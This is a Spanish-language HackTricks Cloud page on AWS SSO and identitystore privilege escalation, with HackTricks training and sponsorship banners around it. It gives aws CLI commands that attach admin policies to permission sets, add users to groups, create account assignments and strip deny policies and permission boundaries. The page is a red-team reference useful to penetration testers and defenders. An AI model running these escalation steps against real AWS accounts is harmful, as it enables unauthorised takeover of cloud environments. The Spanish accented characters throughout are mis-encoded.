# AWS - SSO & identitystore Privesc

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 游눫 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## AWS Identity Center / AWS SSO

Para m치s informaci칩n sobre AWS Identity Center / AWS SSO consulta:

{% content-ref url="../../aws-security/aws-services/aws-iam-enum.md" %}
[aws-iam-enum.md](../../aws-security/aws-services/aws-iam-enum.md)
{% endcontent-ref %}

{% hint style="warning" %}
Ten en cuenta que por **defecto**, solo **los usuarios** con permisos **del** **Management Account** podr치n acceder y **controlar el IAM Identity Center**.\
Los usuarios de otras cuentas solo pueden permitirlo si la cuenta es un **Delegated Administrator.**\
[Consulta la documentaci칩n para m치s informaci칩n.](https://docs.aws.amazon.com/singlesignon/latest/userguide/delegated-admin.html)
{% endhint %}

### ~~Restablecer Contrase침a~~

Una forma f치cil de escalar privilegios en casos como este ser칤a tener un permiso que permita restablecer las contrase침as de los usuarios. Desafortunadamente, solo es posible enviar un correo electr칩nico al usuario para restablecer su contrase침a, por lo que necesitar칤as acceso al correo electr칩nico del usuario.

### `identitystore:CreateGroupMembership`

Con este permiso es posible colocar a un usuario dentro de un grupo para que herede todos los permisos que tiene el grupo.

{% code overflow="wrap" %}
```bash
aws identitystore create-group-membership --identity-store-id <tore-id> --group-id <group-id> --member-id UserId=<user-id>
```
{% endcode %}

### `sso:PutInlinePolicyToPermissionSet`, `sso:ProvisionPermissionSet`

Un atacante con este permiso podr칤a otorgar permisos adicionales a un Conjunto de Permisos que se concede a un usuario bajo su control

{% code overflow="wrap" %}
```bash
# Set an inline policy with admin privileges
aws sso-admin put-inline-policy-to-permission-set --instance-arn <instance-arn> --permission-set-arn <perm-set-arn> --inline-policy file:///tmp/policy.yaml

# Content of /tmp/policy.yaml
{
"Version": "2012-10-17",
"Statement": [
{
"Sid": "Statement1",
"Effect": "Allow",
"Action": ["*"],
"Resource": ["*"]
}
]
}

# Update the provisioning so the new policy is created in the account
aws sso-admin provision-permission-set --instance-arn <instance-arn> --permission-set-arn <perm-set-arn> --target-type ALL_PROVISIONED_ACCOUNTS
```
{% endcode %}

### `sso:AttachManagedPolicyToPermissionSet`, `sso:ProvisionPermissionSet`

Un atacante con este permiso podr칤a otorgar permisos adicionales a un Conjunto de Permisos que se concede a un usuario bajo su control.

{% code overflow="wrap" %}
```bash
# Set AdministratorAccess policy to the permission set
aws sso-admin attach-managed-policy-to-permission-set --instance-arn <instance-arn> --permission-set-arn <perm-set-arn> --managed-policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"

# Update the provisioning so the new policy is created in the account
aws sso-admin provision-permission-set --instance-arn <instance-arn> --permission-set-arn <perm-set-arn> --target-type ALL_PROVISIONED_ACCOUNTS
```
{% endcode %}

### `sso:AttachCustomerManagedPolicyReferenceToPermissionSet`, `sso:ProvisionPermissionSet`

Un atacante con este permiso podr칤a otorgar permisos adicionales a un Conjunto de Permisos que se concede a un usuario bajo su control.

{% hint style="warning" %}
Para abusar de estos permisos en este caso, necesitas conocer el **nombre de una pol칤tica gestionada por el cliente que est칠 dentro de TODAS las cuentas** que se ver치n afectadas.
{% endhint %}

{% code overflow="wrap" %}
```bash
# Set AdministratorAccess policy to the permission set
aws sso-admin attach-customer-managed-policy-reference-to-permission-set --instance-arn <instance-arn> --permission-set-arn <perm-set-arn> --customer-managed-policy-reference <customer-managed-policy-name>

# Update the provisioning so the new policy is created in the account
aws sso-admin provision-permission-set --instance-arn <instance-arn> --permission-set-arn <perm-set-arn> --target-type ALL_PROVISIONED_ACCOUNTS
```
{% endcode %}

### `sso:CreateAccountAssignment`

Un atacante con este permiso podr칤a otorgar un Conjunto de Permisos a un usuario bajo su control a una cuenta.

{% code overflow="wrap" %}
```bash
aws sso-admin create-account-assignment --instance-arn <instance-arn> --target-id <account_num> --target-type AWS_ACCOUNT --permission-set-arn <permission_set_arn> --principal-type USER --principal-id <principal_id>
```
{% endcode %}

### `sso:GetRoleCredentials`

Devuelve las credenciales a corto plazo de STS para un nombre de rol dado que est치 asignado al usuario.

{% code overflow="wrap" %}
```
aws sso get-role-credentials --role-name <value> --account-id <value> --access-token <value>
```
{% endcode %}

Sin embargo, necesitas un token de acceso que no estoy seguro de c칩mo obtener (TODO).

### `sso:DetachManagedPolicyFromPermissionSet`

Un atacante con este permiso puede eliminar la asociaci칩n entre una pol칤tica administrada de AWS y el conjunto de permisos especificado. Es posible otorgar m치s privilegios a trav칠s de **desvincular una pol칤tica administrada (pol칤tica de denegaci칩n)**.

{% code overflow="wrap" %}
```bash
aws sso-admin detach-managed-policy-from-permission-set --instance-arn <SSOInstanceARN> --permission-set-arn <PermissionSetARN> --managed-policy-arn <ManagedPolicyARN>
```
{% endcode %}

### `sso:DetachCustomerManagedPolicyReferenceFromPermissionSet`

Un atacante con este permiso puede eliminar la asociaci칩n entre una pol칤tica gestionada por el cliente del conjunto de permisos especificado. Es posible otorgar m치s privilegios a trav칠s de **desvincular una pol칤tica gestionada (pol칤tica de denegaci칩n)**.

{% code overflow="wrap" %}
```bash
aws sso-admin detach-customer-managed-policy-reference-from-permission-set --instance-arn <value> --permission-set-arn <value> --customer-managed-policy-reference <value>
```
{% endcode %}

### `sso:DeleteInlinePolicyFromPermissionSet`

Un atacante con este permiso puede eliminar los permisos de una pol칤tica en l칤nea del conjunto de permisos. Es posible otorgar **m치s privilegios al desvincular una pol칤tica en l칤nea (pol칤tica de denegaci칩n)**.

{% code overflow="wrap" %}
```bash
aws sso-admin delete-inline-policy-from-permission-set --instance-arn <SSOInstanceARN> --permission-set-arn <PermissionSetARN>
```
{% endcode %}

### `sso:DeletePermissionBoundaryFromPermissionSet`

Un atacante con este permiso puede eliminar el L칤mite de Permisos del conjunto de permisos. Es posible otorgar **m치s privilegios al eliminar las restricciones del Conjunto de Permisos** dado por el L칤mite de Permisos.

{% code overflow="wrap" %}
```bash
aws sso-admin   delete-permissions-boundary-from-permission-set --instance-arn <value> --permission-set-arn <value>
```
{% endcode %}

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripci칩n**](https://github.com/sponsors/carlospolop)!
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤guenos** en **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>
{% endhint %}
